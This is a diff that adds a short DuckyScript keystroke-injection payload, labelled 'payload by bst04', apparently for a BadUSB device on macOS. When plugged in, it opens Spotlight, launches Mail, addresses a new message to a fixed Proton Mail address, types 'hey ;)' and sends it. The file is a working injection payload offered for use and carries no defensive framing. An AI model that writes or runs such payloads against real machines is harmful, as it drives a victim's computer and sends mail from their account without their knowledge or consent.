@@ -1,0 +1,24 @@
+REM =======================
+REM payload by bst04
+REM =======================
+
+DELAY 1000
+GUI SPACE
+DELAY 250
+STRING MAIL
+DELAY 250
+ENTER
+DELAY 500
+GUI n
+DELAY 500
+STRING brunoooost@proton.me
+DELAY 250
+TAB
+DELAY 250
+TAB
+DELAY 250
+TAB
+DELAY 250
+STRING hey ;) 
+DELAY 250
+GUI SHIFT d
